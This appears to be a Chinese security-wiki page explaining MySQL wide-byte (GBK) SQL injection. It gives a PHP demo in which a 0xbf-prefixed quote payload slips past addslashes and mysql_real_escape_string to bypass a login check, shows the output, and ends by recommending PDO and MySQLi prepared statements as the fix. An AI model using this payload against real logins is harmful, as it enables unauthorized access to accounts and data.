<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>mysql宽字节注入 - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;mysql宽字节注入</div>
</div>
<div class="clearfix"></div>
<div id="title">mysql宽字节注入</div>
  <div id="content">
  <h2 id="mysql">mysql 宽字节注入</h2>
<h2 id="addslashermysql_real_escape_stringtrick">绕过addslasher和mysql_real_escape_string(Trick)</h2>
<blockquote>
<p>在MYSQL5.5.37-log下该Trick已经被修复了</p>
</blockquote>
<p>demo as follow:</p>
<ul>
<li>mysql</li>
</ul>
<div class="hlcode"><pre><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">database</span> <span class="n">test_gbk</span> <span class="k">default</span> <span class="kp">charset</span> <span class="n">GBK</span><span class="p">;</span> 
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">use</span> <span class="n">test_gbk</span><span class="p">;</span>
<span class="k">Database</span> <span class="n">changed</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="nf">users</span> <span class="p">(</span>  
    <span class="n">username</span> <span class="kt">VARCHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">CHARACTER</span> <span class="kt">SET</span> <span class="n">GBK</span><span class="p">,</span>  
    <span class="n">password</span> <span class="kt">VARCHAR</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="k">CHARACTER</span> <span class="kt">SET</span> <span class="n">GBK</span><span class="p">,</span>  
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">username</span><span class="p">)</span>  
<span class="p">);</span> 
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="n">rows</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">53</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">users</span> <span class="kt">SET</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;t1&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;t123456&#39;</span><span class="p">;</span>  
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>  

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">users</span> <span class="kt">SET</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;t2&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;t223456&#39;</span><span class="p">;</span>  
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="n">users</span> <span class="kt">SET</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;t3&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;t33456&#39;</span><span class="p">;</span>  
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span> 
</pre></div>


<ul>
<li>php</li>
</ul>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>  
<span class="k">echo</span> <span class="s2">&quot;PHP version: &quot;</span><span class="o">.</span><span class="k">PHP_VERSION</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>  

<span class="c1"># change as yours  </span>
<span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;servername&#39;</span><span class="p">,</span><span class="s1">&#39;username&#39;</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">);</span>  

<span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;test_gbk&quot;</span><span class="p">);</span>  
<span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SET NAMES GBK&quot;</span><span class="p">);</span>  

<span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0xbf</span><span class="p">)</span><span class="o">.</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x27</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; OR username = username /*&#39;</span><span class="p">;</span>  
<span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;guess&#39;</span><span class="p">;</span>  

<span class="nv">$username</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>  
<span class="nv">$password</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>  
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM  users WHERE  username = &#39;</span><span class="si">$username</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$password</span><span class="s2">&#39;&quot;</span><span class="p">;</span>  
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="k">or</span> <span class="nb">trigger_error</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="nv">$sql</span><span class="p">);</span>  

<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>  
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_client_encoding</span><span class="p">());</span>  

<span class="nv">$username</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>  
<span class="nv">$password</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>  
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM  users WHERE  username = &#39;</span><span class="si">$username</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$password</span><span class="s2">&#39;&quot;</span><span class="p">;</span>  
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="k">or</span> <span class="nb">trigger_error</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="nv">$sql</span><span class="p">);</span>  

<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>  
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_client_encoding</span><span class="p">());</span>  

<span class="nb">mysql_set_charset</span><span class="p">(</span><span class="s2">&quot;GBK&quot;</span><span class="p">);</span>  
<span class="nv">$username</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]);</span>  
<span class="nv">$password</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>  
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM  users WHERE  username = &#39;</span><span class="si">$username</span><span class="s2">&#39; AND password = &#39;</span><span class="si">$password</span><span class="s2">&#39;&quot;</span><span class="p">;</span>  
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="k">or</span> <span class="nb">trigger_error</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="nv">$sql</span><span class="p">);</span>  

<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>  
<span class="nb">var_dump</span><span class="p">(</span><span class="nb">mysql_client_encoding</span><span class="p">());</span>  
</pre></div>


<p>run </p>
<div class="hlcode"><pre><span class="p">$</span><span class="nv">php</span><span class="x"> test_gbk.php</span>

<span class="x">PHP version: 5.2.5  </span>
<span class="x">int(3)  </span>
<span class="x">string(6) &quot;latin1&quot;  </span>
<span class="x">int(3)  </span>
<span class="x">string(6) &quot;latin1&quot;  </span>
<span class="x">int(0)  </span>
<span class="x">string(3) &quot;gbk&quot;</span>
</pre></div>


<p>使用addslashes还是mysql_real_escape_string,我都可以利用编码的漏洞来实现输入任意密码就能登录服务器的注入攻击！！！！</p>
<p>第三个mysql_real_escape_string之所以能够防注入是因为mysql_escape_string本身并没办法判断当前的编码，必须同时指定服务端的编码和客户端的编码，加上就能防编码问题的注入了</p>
<ul>
<li>解决方案</li>
</ul>
<p>使用拥有Prepared Statement机制的PDO和MYSQLi来代替mysql_query(注：mysql_query自 PHP 5.5.0 起已废弃，并在将来会被移除)：</p>
<p>PDO：</p>
<div class="hlcode"><pre><span class="x">$pdo = new PDO(&#39;mysql:dbname=dbtest;host=127.0.0.1;charset=utf8&#39;, &#39;user&#39;, &#39;pass&#39;);  </span>

<span class="x">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);  </span>
<span class="x">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  </span>
<span class="x">$stmt = $pdo-&gt;prepare(&#39;SELECT * FROM employees WHERE name = :name&#39;);  </span>
<span class="x">$stmt-&gt;execute(array(&#39;name&#39; =&gt; $name));  </span>

<span class="x">foreach ($stmt as $row) {  </span>
<span class="x">    // do something with $row  </span>
<span class="x">}  </span>
</pre></div>


<p>MYSQLi：</p>
<div class="hlcode"><pre><span class="p">$</span><span class="nv">stmt</span><span class="x"> = </span><span class="p">$</span><span class="nv">dbConnection</span><span class="x">-&gt;prepare(&#39;SELECT * FROM employees WHERE name = ?&#39;);  </span>
<span class="p">$</span><span class="nv">stmt</span><span class="x">-&gt;bind_param(&#39;s&#39;, </span><span class="p">$</span><span class="nv">name</span><span class="x">);  </span>

<span class="p">$</span><span class="nv">stmt</span><span class="x">-&gt;execute();  </span>

<span class="p">$</span><span class="nv">result</span><span class="x"> = </span><span class="p">$</span><span class="nv">stmt</span><span class="x">-&gt;get_result();  </span>
<span class="x">while (</span><span class="p">$</span><span class="nv">row</span><span class="x"> = </span><span class="p">$</span><span class="nv">result</span><span class="x">-&gt;fetch_assoc()) </span><span class="err">{</span><span class="x">  </span>
<span class="x">    // do something with </span><span class="p">$</span><span class="nv">row</span><span class="x">  </span>
<span class="x">}  </span>
</pre></div>
</div>

        </div>
        <div id="footer">
            <span>
                Copyright © 2012-2016 .
                Powered by <a href="http://simiki.org/" target="_blank">Simiki</a>.
            </span>
        </div>
        
    </body>
</html>